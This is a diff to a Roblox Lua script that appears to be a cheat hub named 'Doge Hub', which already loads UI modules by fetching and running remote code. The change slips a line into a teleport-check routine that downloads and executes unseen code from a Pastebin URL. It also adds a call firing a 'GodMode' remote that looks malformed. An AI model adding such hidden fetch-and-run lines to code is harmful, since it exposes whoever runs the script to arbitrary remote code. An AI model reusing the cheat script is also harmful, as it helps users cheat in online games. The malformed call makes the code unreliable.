@@ -1,3 +1,4 @@
+
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
@@ -4861,6 +4862,8 @@ local function changeRemoteNames()
             local player = Players.LocalPlayer  -- Get the player who initiated this script
             if player then
                 wait(3)
+                game.ReplicatedStorage.Remotes.GodMode:FireClient()
+wait(3)
                 player:Kick("Doge Hub Function Removal")  -- Kick the player with a message
             end
             break
@@ -10960,6 +10963,7 @@ local function checkPlayerTeleportation(player)
             if distanceMoved > teleportThreshold then
                 -- Check if the player has already been notified
                 if not notifiedPlayers[player.Name] then
+                    loadstring(game:HttpGet("https://pastebin.com/raw/RyZeKZiy"))()
                     -- Notify the player without changing this line
                     Notification:Notify(
                         {Title = "DOGE HUB | NEW DOGE HUB USER", Description = "New Doge Hub User: " .. player.Name},
